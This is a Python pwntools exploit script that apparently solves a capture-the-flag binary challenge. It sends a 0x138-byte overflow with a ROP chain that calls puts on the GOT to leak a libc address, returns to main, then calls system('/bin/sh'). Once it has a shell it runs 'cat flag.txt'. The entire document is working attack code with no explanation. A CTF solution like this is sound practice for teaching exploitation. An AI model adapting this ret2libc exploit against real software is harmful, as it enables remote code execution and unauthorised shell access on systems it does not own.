#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 30212
HOST = "chall.v1t.site"
exe = context.binary = ELF('./chall_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-linux.so.2', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            source /home/nhh/pwndbg/gdbinit.py
            b* 0x08049229
            b* 0x08049224
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()


# VARIABLE
puts_got = exe.got.puts
main = exe.sym.main

# PAYLOAD
payload = flat(
    b'a'*0x138,
    exe.plt.puts,
    main,
    puts_got,
    )
# GDB()
p.sendafter(b'here!\n', payload)
libc_leak = u32(p.recv(4))
libc.address = libc_leak - 0x78140
log.info("Libc base: " + hex(libc.address))
system = libc.sym.system
bin_sh = next(libc.search(b'/bin/sh'))

payload = flat(
    b'a'*0x138,
    system,
    b'a'*4,
    bin_sh
    )
p.sendline(payload)

p.sendline(b'cat flag.txt')

p.interactive()